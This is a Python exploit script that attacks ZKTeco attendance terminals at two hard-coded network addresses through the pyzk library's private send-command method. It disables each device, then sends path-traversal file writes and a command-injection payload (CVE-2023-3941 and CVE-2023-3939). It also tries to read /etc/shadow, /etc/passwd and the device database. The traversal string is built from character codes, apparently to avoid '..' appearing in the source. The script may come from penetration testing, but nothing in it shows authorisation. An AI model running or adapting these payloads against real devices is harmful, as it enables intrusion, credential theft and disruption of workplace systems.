#!/usr/bin/env python3
"""
Test CVE-2023-3941/3939 on ZK device using pyzk's __send_command (mangled).
Uses the proven pyzk wire format including TCP top header.
"""
import sys
sys.path.insert(0, 'D:\\chamcong\\AttendanceSuite_Portable\\python\\Lib\\site-packages')
sys.stdout.reconfigure(encoding='utf-8')

import socket
import struct
import time
from zk import ZK, const
from zk.base import make_commkey
from zk.exception import ZKNetworkError, ZKErrorResponse

TARGETS = [
    ('172.16.0.214', 'May 3 X628 PRO'),
    ('172.16.254.202', 'Web UI 4000TID-C'),
]

# Path traversal payload builders (avoid .. in source)
TRAV = ".." + chr(47) + ".." + chr(47) + ".." + chr(47) + ".." + chr(47) + ".." + chr(47) + ".." + chr(47) + ".." + chr(47) + "mnt" + chr(47) + "mtdblock" + chr(47) + "data" + chr(47) + "mavis_evidence.txt"
TRAV_BIN = TRAV.encode() + b"\x00"
INJECT = b"; touch /tmp/mavis_pwn" + b"\x00"

def send_cmd(conn, command, data=b''):
    """Send a raw command via pyzk's internal send_command."""
    try:
        # Use the mangled private method
        result = conn._ZK__send_command(command, data, response_size=1024)
        return result
    except Exception as e:
        return {'status': False, 'error': f'{type(e).__name__}: {e}'}

def test_target(ip, name):
    print(f'\n{"="*60}')
    print(f'TARGET: {name} ({ip})')
    print(f'{"="*60}')
    zk = ZK(ip, port=4370, timeout=10, password=0)
    try:
        conn = zk.connect()
        if not conn:
            print('  [FAIL] connect returned None')
            return
    except Exception as e:
        print(f'  [FAIL] connect: {type(e).__name__}: {e}')
        return

    print(f'  [+] Connected')
    print(f'  Firmware: {conn.get_firmware_version()}')
    print(f'  Platform: {conn.get_platform()}')

    try:
        conn.disable_device()
        print(f'  [+] Device disabled')
    except Exception as e:
        print(f'  [!] disable failed: {e}')

    # Probe photo-related commands (no data)
    print(f'\n--- Photo-related commands (no data) ---')
    for cmd_code in [0x02F6, 0x02F7, 0x02F8, 0x02F9, 0x02FA, 0x02FB, 0x02FC, 0x02FD,
                     0x03F0, 0x03F1, 0x03F2, 0x03F3, 0x03F4, 0x03F5, 0x03F6, 0x03F7]:
        r = send_cmd(conn, cmd_code, b'')
        if 'error' in r:
            print(f'  0x{cmd_code:04X}: ERR {r["error"]}')
        else:
            print(f'  0x{cmd_code:04X}: {"OK" if r["status"] else "FAIL"} code={r.get("code")}')

    # CVE-2023-3941: USRPIC upload with path traversal
    print(f'\n--- CVE-2023-3941 USRPIC upload (path traversal) ---')
    payload = b'PIN=1\x00' + TRAV_BIN + b'PWNED_CONTENT_MAVIS_2026'
    for cmd in [0x02FA, 0x03F4, 0x02F8]:
        r = send_cmd(conn, cmd, payload)
        if 'error' in r:
            print(f'  WRITE 0x{cmd:04X}: ERR {r["error"]}')
        else:
            print(f'  WRITE 0x{cmd:04X}: {"OK" if r["status"] else "FAIL"} code={r.get("code")}')

    # CVE-2023-3939: USRPIC delete with command injection
    print(f'\n--- CVE-2023-3939 USRPIC delete (cmd injection) ---')
    payload = b'PIN=1\x00' + INJECT
    for cmd in [0x02F7, 0x03F5]:
        r = send_cmd(conn, cmd, payload)
        if 'error' in r:
            print(f'  DEL 0x{cmd:04X}: ERR {r["error"]}')
        else:
            print(f'  DEL 0x{cmd:04X}: {"OK" if r["status"] else "FAIL"} code={r.get("code")}')

    # UPDATEFILE with path traversal
    print(f'\n--- UPDATEFILE path traversal ---')
    payload = TRAV_BIN + b'UPLOADED_VIA_UPDATEFILE'
    r = send_cmd(conn, 0x6A4, payload)
    print(f'  UPDATEFILE 0x6A4: {"OK" if r.get("status") else "FAIL"} code={r.get("code")}')

    # READFILE attempts
    print(f'\n--- READFILE attempts ---')
    for path in [b'/etc/shadow\x00', b'/mnt/mtdblock/data/ZKDB.db\x00', b'/etc/passwd\x00',
                 b'mavis_evidence.txt\x00', b'/mnt/mtdblock/data/mavis_evidence.txt\x00']:
        r = send_cmd(conn, 0x6A6, path)
        if 'error' in r:
            print(f'  READFILE {path[:30]!r}: ERR {r["error"]}')
        else:
            print(f'  READFILE {path[:30]!r}: {"OK" if r["status"] else "FAIL"} code={r.get("code")}')

    try:
        conn.enable_device()
    except: pass
    conn.disconnect()
    print(f'\n[+] Done {ip}')

def main():
    for ip, name in TARGETS:
        try:
            test_target(ip, name)
        except Exception as e:
            print(f'  [TOP-LEVEL FAIL] {type(e).__name__}: {e}')
        time.sleep(5)

if __name__ == '__main__':
    main()
